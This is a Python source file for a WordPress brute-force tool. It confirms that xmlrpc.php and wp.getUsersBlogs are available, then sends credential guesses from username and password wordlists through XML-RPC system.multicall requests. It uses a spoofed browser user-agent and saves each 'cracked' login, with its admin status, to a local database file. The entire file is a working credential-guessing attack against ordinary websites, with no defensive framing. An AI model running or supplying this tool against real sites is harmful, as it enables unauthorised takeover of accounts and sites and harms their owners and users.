import os
import sys
import time
import datetime
import requests
import urllib.request
from urllib.parse import urlparse

global TIMEOUT
global REQUEST_TYPE
global GetUserBlogsValid
TIMEOUT = 0
REQUEST_TYPE = "POST"
GetUserBlogsValid = False

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def GOOD_WRITE(TEXT):
    print(color.GREEN+"    [+] "+color.END+TEXT)

def INFO_WRITE(TEXT):
    print(color.BLUE+"    [i] "+color.END+TEXT)

def ERROR_WRITE(TEXT):
    print(color.RED+"    [-] "+color.END+TEXT)

def WARNING_WRITE(TEXT):
    print(color.YELLOW+"    [!] "+color.END+TEXT)

def WRITE_TO_LOGS(INDEX, USER, PASS, IsAdmin, URL):
    os.chdir("logs")
    TIME = datetime.datetime.now()
    LOG_PATH = "log.txt"
    try:
        FILE_TEST = open(LOG_PATH, 'r')
    except IOError:
        FILE_TEST = open(LOG_PATH, 'w')
    FILE_TEST.close()
    LOG_FILE = open(LOG_PATH, 'a')
    LOG_FILE.write("Attempt [{0}] at {1} => {2}:{3} - Admin?: {4}\n".format(str(INDEX), TIME.strftime("%Y-%m-%d %H:%M:%S"), USER, PASS, IsAdmin))
    LOG_FILE.close()
    os.chdir("..")
    os.chdir("database")
    DB_FILE = open("cracked_accounts.txt", "a")
    DB_FILE.write("{0} => {1}:{2} - Admin:{3}\n".format(URL, USER, PASS, str(IsAdmin)))
    DB_FILE.close()
    os.chdir("..")

def REQUEST(URL, USER, PASS, INDEX):
    global TIMEOUT
    global REQUEST_TYPE
    global AccCracked
    VALID_REQUEST = False
    GOT_CODE = False
    VALID_CODE = False
    HEADERS = {
        'User-Agent': '''"Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77a Safari/525.20"''',
        'Content-Type': 'application/xml',
    }
    try:
        data = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{0}</string></value><value><string>{1}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(USER,PASS).encode()
        REQE = urllib.request.Request(URL, data, headers=HEADERS)
        RESPONCE = urllib.request.urlopen(REQE)
        VALID_REQUEST = True
    except:
        WARNING_WRITE("Error at sending and receiving an HTTP(s) response, adding timeout of 1 second...")
        TIMEOUT = TIMEOUT + 1
        RESPONCE = ""
        pass
    if VALID_REQUEST == True:
        XML_RESULTS = RESPONCE.read().decode()
        ToReplace = ['<value>','</value>','<array>','</array>','<data>','</data>','<struct>','</struct>','<member>','</member>','<name>','</name>','<boolean>','</boolean>','<methodResponse>','</methodResponse>','<methodCall>','</methodCall>','<param>','</param>','<?xml version="1.0" encoding=UTF-8"?>']
        for Str in ToReplace:
            XML_RESULTS = XML_RESULTS.replace(Str, "")
        if "isAdmin1" in XML_RESULTS or "isAdmin0" in XML_RESULTS:
            IsAdmin = ""
            if "isAdmin1" in XML_RESULTS:
                IsAdmin = True
            else:
                IsAdmin = False
            GOOD_WRITE("Account '{0}' cracked!\n        \033[92m- {1}:{2} - Admin?: {3}\033[0m".format(USER,USER,PASS,str(IsAdmin)))
            WRITE_TO_LOGS(INDEX, USER, PASS, IsAdmin, URL)
            INFO_WRITE("Written to logs!")
    return 200

def XmlrpcScan(URL):
    global REQUEST_TYPE
    global GetUserBlogsValid
    VALID_REQUEST = False
    INFO_WRITE("Checking if XML-RPC is running ...")
    HEADERS = {
        'User-Agent': '''"Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77a Safari/525.20"''',
        'Content-Type': 'application/xml',
    }
    try:
        RESPONCE = requests.get(URL+"/xmlrpc.php", headers=HEADERS)
        VALID_REQUEST = True
    except:
        WARNING_WRITE("Error at sending and receiving an HTTP(s) response.")
        RESPONCE = ""
        pass
    if VALID_REQUEST == True:
        if "XML-RPC server accepts" in RESPONCE.content.decode():
            GOOD_WRITE("Getting required HTTP-Request Type ...")
            if "XML-RPC server accepts POST requests only." in RESPONCE.content.decode():
                REQUEST_TYPE = "POST"
            elif "XML-RPC server accepts GET requests only." in RESPONCE.content.decode():
                REQUEST_TYPE = "GET"
            else:
                WARNING_WRITE("Server did not send back HTTP-Request Type, we are assuming its GET.")
                REQUEST_TYPE = "GET"
            GOOD_WRITE("HTTP-Request Type: "+REQUEST_TYPE)
            INFO_WRITE("Checking if wp.getUsersBlogs can be used ...")
            HEADERS = {
                'User-Agent': '''"Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77a Safari/525.20"''',
                'Content-Type': 'application/xml',
            }
            try:
                data = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>""".encode()
                REQUEST = urllib.request.Request(URL + "/xmlrpc.php", data, headers=HEADERS)
                RESPONCE = urllib.request.urlopen(REQUEST)
                VALID_REQUEST = True
            except:
                WARNING_WRITE("Error at sending and receiving an HTTP(s) response.")
                RESPONCE = ""
                pass
            if "wp.getUsersBlogs" in RESPONCE.read().decode():
                GOOD_WRITE("wp.getUsersBlogs and XML-RPC are available!")
                GetUserBlogsValid = True
            else:
                ERROR_WRITE("wp.getUsersBlogs is not available! Please try to use 'bruteforce wp-login.php'...")
            return 0
        else:
            return 1
    else:
        return 200

def BRUTEFORCE(USER, PASSWORD_LIST, URL):
    global TIMEOUT
    PASSWORD_LIST = open(PASSWORD_LIST, "r", encoding="latin-1")
    INDEX = 0
    try:
        for PASS in PASSWORD_LIST.readlines():
            INDEX = INDEX + 1
            PASS = PASS.rstrip("\n")
            time.sleep(TIMEOUT)
            INFO_WRITE("Attempt {0} => {1}:{2}".format(str(INDEX), USER, PASS))
            REQUEST(URL+"/xmlrpc.php", USER, PASS, INDEX)
    except KeyboardInterrupt:
        ERROR_WRITE("CTRL+C detected, quitting ...\n")
        sys.exit()

def BruteforceXmlrpc(WEBSITE_TO_BRUTE, USERNAME_LIST, PASSWORD_LIST):
    global REQUEST_TYPE
    global GetUserBlogsValid
    URL = ""
    DOMAIN = urlparse(WEBSITE_TO_BRUTE)
    if DOMAIN.scheme == "https":
        URL = "https://"+DOMAIN.netloc
    elif DOMAIN.scheme == "http":
        URL = "http://"+DOMAIN.netloc
    if os.path.exists(USERNAME_LIST):
        if os.path.exists(PASSWORD_LIST):
            XmlrpcIsValid = XmlrpcScan(URL)
            if GetUserBlogsValid == True:
                print("""
    +----------------------------+
    +-Starting Bruteforce Attack-+
    +---------- XML-RPC ---------+
    Press CTRL+C A Few Times (3) 
    To Stop The Attack.\n""")
                USER_FILE = open(USERNAME_LIST, "r", encoding="latin-1")
                PASS_FILE = open(PASSWORD_LIST, "r", encoding="latin-1")
                INDEX = 0
                USERS = []
                PASS = []
                for USER in USER_FILE.readlines():
                    USERS.append(USER)
                for PASSWORD in PASS_FILE.readlines():
                    PASS.append(PASSWORD)
                if not len(USER) == 0:
                    if not len(PASS) == 0:
                        for USER in USERS:
                            BRUTEFORCE(USER.rstrip("\n"), PASSWORD_LIST, URL)
                    else:
                        ERROR_WRITE("{0} is empty!".format(PASSWORD_LIST))
                else:
                    ERROR_WRITE("{0} is empty!".format(USER_FILE))